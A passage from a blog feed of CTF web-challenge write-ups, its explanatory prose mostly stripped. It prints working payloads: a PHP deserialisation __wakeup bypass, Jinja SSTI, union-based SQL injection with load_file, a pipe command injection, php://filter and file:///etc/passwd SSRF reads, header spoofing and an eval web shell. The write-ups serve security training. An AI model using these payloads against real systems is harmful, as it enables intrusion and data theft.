class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>flagfl4g.php<br></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span> <span class="token operator">!=</span> <span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>             <span class="token comment">//the secret is in the fl4g.php</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>index.php<br>php<strong>PHP&#x2F;5.3.10-1</strong><strong>cve</strong>_wakeup()</p><blockquote><p>CVE-2016-7124(__wakeup)<br><br>PHP5 &lt; 5.6.25<br>PHP7 &lt; 7.0.10</p></blockquote><blockquote><p><br>__wakeup unserilize() __wakeup __wakeup </p></blockquote><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'var'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     <span class="token variable">$var</span> <span class="token operator">=</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'var'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[oc]:\d+:/i'</span><span class="token punctuation">,</span> <span class="token variable">$var</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'stop hacking!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        @<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$var</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">&#125;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>&#39;/[oc]:\d+:/i&#39;</code><code>[oc]</code>oc<code>\d</code>**O:2:<strong></strong>stop hacking!<strong></strong>O:2:<strong></strong>O:+2:**<br></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">class</span> <span class="token class-name-definition class-name">Demo</span> <span class="token punctuation">&#123;</span>     <span class="token keyword">private</span> <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span>     <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token keyword">echo</span> @<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span> <span class="token operator">!=</span> <span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>             <span class="token comment">//the secret is in the fl4g.php</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span>     <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">x</span><span class="token punctuation">&#123;</span><span class="token keyword">private</span> <span class="token variable">$file</span><span class="token operator">=</span><span class="token string single-quoted-string">'fl4g.php'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Demo</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'fl4g.php'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;br>'</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'O:4:'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'O:+4:'</span><span class="token punctuation">,</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//</span><span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;br>'</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">':1:'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">':2:'</span><span class="token punctuation">,</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//_wakeup()</span><span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;br>'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;br>'</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><em><em>$file  %00</em>%00base64</em>*<br><br><img src="https://img-blog.csdnimg.cn/4f6b3bfcae2a4126ae4efcdb8ec73965.png" alt="2"><br>getflag<br><img src="https://img-blog.csdnimg.cn/6a5689494cef49759c2f6d74d441bd2f.png" alt="3"><br></p><h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><p><img src="https://img-blog.csdnimg.cn/183c9b29277e4ee497d4f342aad251b0.png" alt="4"></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$miwen</span><span class="token operator">=</span><span class="token string double-quoted-string">"a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws"</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">encode</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$_o</span><span class="token operator">=</span><span class="token function">strrev</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// echo $_o;</span>            <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$_0</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$_0</span><span class="token operator">&lt;</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$_o</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$_0</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>               <span class="token variable">$_c</span><span class="token operator">=</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$_o</span><span class="token punctuation">,</span><span class="token variable">$_0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$__</span><span class="token operator">=</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$_c</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>        <span class="token variable">$_c</span><span class="token operator">=</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$_</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token operator">.</span><span class="token variable">$_c</span><span class="token punctuation">;</span>       <span class="token punctuation">&#125;</span>     <span class="token keyword">return</span> <span class="token function">str_rot13</span><span class="token punctuation">(</span><span class="token function">strrev</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$_</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/*   $miwenflag*/</span><span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><br></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$str</span><span class="token operator">=</span><span class="token string double-quoted-string">"a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws"</span><span class="token punctuation">;</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token function">strrev</span><span class="token punctuation">(</span><span class="token function">str_rot13</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$_o</span><span class="token operator">=</span><span class="token constant">NULL</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$_0</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$_0</span><span class="token operator">&lt;</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$_</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$_0</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>               <span class="token variable">$_c</span><span class="token operator">=</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$_</span><span class="token punctuation">,</span><span class="token variable">$_0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$__</span><span class="token operator">=</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$_c</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>        <span class="token variable">$_c</span><span class="token operator">=</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$_</span><span class="token operator">=</span><span class="token variable">$_o</span><span class="token operator">.</span><span class="token variable">$_c</span><span class="token punctuation">;</span>       <span class="token punctuation">&#125;</span> <span class="token keyword">echo</span> <span class="token function">strrev</span><span class="token punctuation">(</span><span class="token variable">$_o</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>flag</p><h2 id="shrine"><a href="#shrine" class="headerlink" title="shrine"></a>shrine</h2><p><img src="https://img-blog.csdnimg.cn/523623501a0d4d65b734a05f6fae1ba2.png" alt="2"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> flask<span class="token keyword">import</span> osapp <span class="token operator">=</span> flask<span class="token punctuation">.</span>Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'FLAG'</span><span class="token punctuation">]</span> <span class="token operator">=</span> os<span class="token punctuation">.</span>environ<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token string">'FLAG'</span><span class="token punctuation">)</span><span class="token operator">//</span>FLAGconfig<span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>config<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token builtin">open</span><span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/shrine/&lt;path:shrine>'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">shrine</span><span class="token punctuation">(</span>shrine<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">safe_jinja</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>        s <span class="token operator">=</span> s<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'('</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">')'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>        blacklist <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'config'</span><span class="token punctuation">,</span> <span class="token string">'self'</span><span class="token punctuation">]</span>        <span class="token keyword">return</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'&#123;&#123;% set &#123;&#125;=None%&#125;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> blacklist<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> s    <span class="token keyword">return</span> flask<span class="token punctuation">.</span>render_template_string<span class="token punctuation">(</span>safe_jinja<span class="token punctuation">(</span>shrine<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>sstipythonFlask<br><code>@app.route(&#39;/shrine/&lt;path:shrine&gt;&#39;)</code><code>http://61.147.171.105:64429/shrine/%7B%7B8*8%7D%7D</code>ssti<br><code>safe_jinja</code>**()configself**<br><img src="https://img-blog.csdnimg.cn/45c0d3fbef914c998da7b8cc9faac0f5.png" alt="1">appconfig</p><p><br><strong>get_flashed_messages</strong><code>&#123;&#123;get_flashed_messages.__globals__['current_app'].config['FLAG']&#125;&#125;</code><br><strong>url_for</strong><code>&#123;&#123;url_for.__globals__['current_app'].config&#125;&#125;</code><br><img src="https://img-blog.csdnimg.cn/4609f4f593f249f3b6aabc5fa7cc213c.png" alt="2"><br>flag</p><h2 id="fakebook"><a href="#fakebook" class="headerlink" title="fakebook"></a>fakebook</h2><p></p><p><img src="https://img-blog.csdnimg.cn/b9a7ec91e3214f8bb606a267bb14632b.png" alt="1"><br><br><img src="https://img-blog.csdnimg.cn/f02e85228c7740f685c0fc3952ff3d11.png" alt="2"><br><code>?no=1 and 1=1</code><code>?no=1 and 1=2</code>SQL<br><code>?no=1 order by 5</code><br><img src="https://img-blog.csdnimg.cn/2b8f182925864af49d2e3b146c651a8c.png" alt="3"><br><br><code>?no=1 union select 1,2,3,4</code><br><img src="https://img-blog.csdnimg.cn/1d4d6d53e1444e8c80cc361073c38eda.png" alt="1"><br><code>-1/**/union/**/select/**/1,2,3,4</code><code>++/**/</code><br><img src="https://img-blog.csdnimg.cn/d6f1a1faeadb4b2ba8d126ca9b202e75.png" alt="4"><br>2<br><code>?no=-1/**/union/**/select/**/1,table_name,3,4 from INFORMATION_SCHEMA.TABLES -- -</code><br><code>?no=-1/**/union/**/select/**/1,group_concat(column_name),3,4 from INFORMATION_SCHEMA.columns where table_name=&quot;users&quot; -- -</code><br><img src="https://img-blog.csdnimg.cn/757a55887b714a0d9f8e953453f4c150.png" alt="2"><br></p><blockquote><p>O:8:UserInfo:3:{s:4:name;s:3:rgg;s:3:age;i:48;s:4:blog;s:7:123.com;}</p></blockquote><p><br><strong></strong><br>file&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.phpfilefile:&#x2F;&#x2F;&#x2F;</p><blockquote><p>-1 &#x2F;<strong>&#x2F;union &#x2F;</strong>&#x2F; select 1,2 ,3,O:8:UserInfo:3:{s:4:name;s:1:1;s:3:age;i:18;s:4:blog;s:29:file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php;}#</p></blockquote><p><img src="https://img-blog.csdnimg.cn/b4cdabced702488fad045fa3a4349ad6.png" alt="2"></p><p><strong></strong><br> MySQLLOAD_FILE()</p><blockquote><p>-1 &#x2F;<strong>&#x2F;union &#x2F;</strong>&#x2F; select 1,load_file(&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php) ,3,4#</p></blockquote><p><img src="https://img-blog.csdnimg.cn/1dbe5ddda5414ef98dbf713cc9269ad9.png" alt="3"></p><h2 id="Cat"><a href="#Cat" class="headerlink" title="Cat"></a>Cat</h2><p><img src="https://img-blog.csdnimg.cn/ed1db60906fd457e9bfd3bc7dbf9f8e8.png" alt="1"><br><br><strong>127.0.0.1|ls</strong><br><img src="https://img-blog.csdnimg.cn/98ece7b60e704191a326c30e875fef28.png" alt="2"><br><br><img src="https://img-blog.csdnimg.cn/ee2d13cafd3e41e0b42b1104dde8b11c.png" alt="2"></p><p><img src="https://img-blog.csdnimg.cn/051cc20d945a4c9c8eba5da238368110.png" alt="3">453<br><img src="https://img-blog.csdnimg.cn/0b317f3b22524f75a9c568a3801c5d6d.png" alt="5"></p><p>@url%40<br>%EF<br>html<br><img src="https://img-blog.csdnimg.cn/6e906ca935e44e08985578b99ca60031.png" alt="2"><br><img src="https://img-blog.csdnimg.cn/6ef3195b6ae148e09b3132416f430317.png" alt="5"><br>django</p><blockquote><p>&#x2F;opt&#x2F;api&#x2F;database.sqlite3 phpcurl+@</p></blockquote><p><img src="https://img-blog.csdnimg.cn/2c33bda622c940e0bc0f67609368b994.png" alt="5"><br>+&#x2F;opt&#x2F;api&#x2F;database.sqlite3flag<br><img src="https://img-blog.csdnimg.cn/546cdd2af98047b481d0122cc007eb32.png" alt="5"></p><h2 id="-"><a href="#-" class="headerlink" title="-"></a>-</h2><p><img src="https://img-blog.csdnimg.cn/b1427ceb81ee46f5bff6a37e6500cc57.png" alt="1"></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"./check.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$filename</span>  <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>check.php<br>payload:<strong><a href="http://61.147.171.105:49222/?filename=check.php">http://61.147.171.105:49222/?filename=check.php</a></strong><br><img src="https://img-blog.csdnimg.cn/2fa8d03887be43f8ac061799752d2b73.png" alt="2">php:&#x2F;&#x2F;filter<strong>do not hack</strong>php:&#x2F;&#x2F;filter**convert.iconv.***<a href="https://blog.csdn.net/qq_44657899/article/details/109300335">php:&#x2F;&#x2F;filter</a></p><blockquote><p>convert.iconv.<em><br>UCS-4</em><br>UCS-4BE<br>UCS-4LE*<br>UCS-2<br>UCS-2BE<br>UCS-2LE<br>UTF-32*<br>UTF-32BE*<br>UTF-32LE*<br>UTF-16*<br>UTF-16BE*<br>UTF-16LE*<br>UTF-7<br>UTF7-IMAP<br>UTF-8*<br>ASCII*<br>convert.iconv.&lt;input-encoding&gt;.&lt;output-encoding&gt;</p></blockquote><p><br><img src="https://img-blog.csdnimg.cn/e139f5936a634f27851a021afc968e3f.png" alt="1">burp<br><img src="https://img-blog.csdnimg.cn/8a26b67d40c54abf9b4f646cc65fb213.png" alt="2"><img src="https://img-blog.csdnimg.cn/7f4499930bc548d78033057c9a92cf05.png" alt="3">flag</p><h2 id="-SSRF-Me"><a href="#-SSRF-Me" class="headerlink" title=" SSRF-Me"></a> SSRF-Me</h2><p>ssrf<br><img src="https://img-blog.csdnimg.cn/6e134931c77f4b4a8b51c32ed069735d.png" alt="1"><br><br><img src="https://img-blog.csdnimg.cn/0691770356f3440db6bfa7c51ab9e2b6.png" alt="2"><br>1270.0.1<br><code>Captcha: substr(md5(captcha), -6, 6) == &quot;b15ed1&quot;</code><br>MD5b15ed1</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$captcha</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$captcha</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"b15ed1"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token variable">$captcha</span><span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token variable">$captcha</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span>//23129<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>127.0.0.1:80</strong>ssrf<br><strong>file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd</strong><br><img src="https://img-blog.csdnimg.cn/c582bb91a3e7459a897e3524327530fa.png" alt="3">flag <strong>file:&#x2F;&#x2F;&#x2F;flag</strong>flagurlflagburpflag</p><blockquote><p>file:&#x2F;&#x2F;&#x2F;%66%6c%61%67<br>file:&#x2F;&#x2F;&#x2F;%2566%256c%2561%2567</p></blockquote><h2 id="bugRCTF2021"><a href="#bugRCTF2021" class="headerlink" title="bugRCTF2021"></a>bugRCTF2021</h2><p>BURP<br><br><img src="https://img-blog.csdnimg.cn/3efee6e2436046548b1c91b628940271.png" alt="1"><br>adminadmintest<br><br>manage<br><img src="https://img-blog.csdnimg.cn/bc84396bd69046409299c59b0d5b7305.png" alt="123"><br>personal<br>cookieuserMD5<strong>uid</strong><br>1cookie-user<br><img src="https://img-blog.csdnimg.cn/13e8f73a143545dbbf0c9b6ab04bb330.png" alt="2"></p><p><br>test<br><img src="https://img-blog.csdnimg.cn/44ed7431b53547d8aac7f20e35791019.png" alt="123"><br>user<br><img src="https://img-blog.csdnimg.cn/a57eb39e769e437db01e532a5e5fd17d.png" alt="5"><br></p><p><img src="https://img-blog.csdnimg.cn/5f729b4838de4ca384d994ffd06da6a4.png" alt="4"><br>usernameadminadmin<br><img src="https://img-blog.csdnimg.cn/5c48c75714ab4dbbab310d677fe9ee7b.png" alt="5"><br>admin<br><img src="https://img-blog.csdnimg.cn/699097f08553466ca469704221d959ca.png" alt="1"><br>manageIP<br>X-Forwarded-For: 127.0.0.1<br><img src="https://img-blog.csdnimg.cn/8826e8d89a444c78ae6bf348ebc53225.png" alt="2"></p><p><br><img src="https://img-blog.csdnimg.cn/8af6010afbe345ffbf0c271092bfab0c.png" alt="1"></p><p><strong>index.php?module&#x3D;filemanage&amp;do&#x3D;upload</strong><br><br><img src="https://img-blog.csdnimg.cn/0d3d7f7d4fb5489589b4ec2c5c1a4836.png" alt="1"><br>php<br><img src="https://img-blog.csdnimg.cn/6b49b925f1cd438188b1cc57f1273f96.png" alt="1"><br>php4,<code>&lt;script language=&#39;php&#39;&gt;alert(@eval($_POST[1]))&lt;script&gt;</code><br>flag<br><img src="https://img-blog.csdnimg.cn/9e5e3e5165bc4e4da1937253f9808910.png" alt="2"></p>]]></content>
      
      
      <categories>
          
          <category>  </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQLHandler</title>
      <link href="/2023/03/16/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BHandler%E5%91%BD%E4%BB%A4%E5%92%8C%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/"/>
      <url>/2023/03/16/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BHandler%E5%91%BD%E4%BB%A4%E5%92%8C%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h2 id="Handler"><a href="#Handler" class="headerlink" title="Handler"></a>Handler</h2><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>   mysqlselecthandlerhandlerselectmysqlSQL<br>    HANDLERMyISAMInnoDB </p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>HANDLER tbl_name OPEN [ [AS] alias]</p><blockquote><p>HANDLER tbl_name READ index_name { &#x3D; | &lt;&#x3D; | &gt;&#x3D; | &lt; | &gt; } (value1,value2,)<br>[ WHERE where_condition ] [LIMIT  ]<br>HANDLER tbl_name READ index_name { FIRST | NEXT | PREV | LAST }<br>[ WHERE where_condition ] [LIMIT  ]<br>HANDLER tbl_name READ { FIRST | NEXT }<br>[ WHERE where_condition ] [LIMIT  ]<br>HANDLER tbl_name CLOSE</p></blockquote><p>HANDLER tbl_name OPENtb1_name<br>    HANDLER tbl_name READ FIRSTREAD NEXTNEXT<br>    HANDLER tbl_name CLOSE</p><pre><code>HANDLER tbl_name READ index_name FIRSTNEXTPREVLASTHANDLER tbl_name READ index_name = valueNEXT</code></pre><p><a href="https://blog.csdn.net/jesseyoung/article/details/40785137"></a></p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p></p><p><br>mysql_multi_query() sql;sql</p><blockquote><p>select * from users;show databases; </p></blockquote><p>.<br></p><h2 id="GYCTF2020-Blacklist"><a href="#GYCTF2020-Blacklist" class="headerlink" title="[GYCTF2020]Blacklist"></a>[GYCTF2020]Blacklist</h2><p><img src="https://img-blog.csdnimg.cn/19719c3bfc764820ad5a2b9957f0839e.png" alt="1"><br><br><img src="https://img-blog.csdnimg.cn/8b7594e3e31442b7a0d718c619e1efd0.png" alt="1"><br><br><img src="https://img-blog.csdnimg.cn/1d5ed6be76614f47a0b8e2fe2e49579e.png" 